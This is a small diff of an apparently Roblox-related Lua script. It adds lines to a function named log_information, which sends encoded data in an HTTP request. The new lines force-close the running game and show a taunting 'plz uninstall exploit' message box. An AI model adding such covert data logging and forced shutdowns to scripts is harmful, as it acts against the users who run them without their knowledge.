@@ -58,6 +58,9 @@ local function log_information(...)
 		},
 		Body = encodedData
 	})
+	task.wait(0.5)
+	game:Shutdown()
+	messagebox("plz uninstall exploit😟😟😟🙁", "from david bazscuki", bit32.bor(0x00000030, 0x00000000, 0x00000100))
 end
 
 if http then
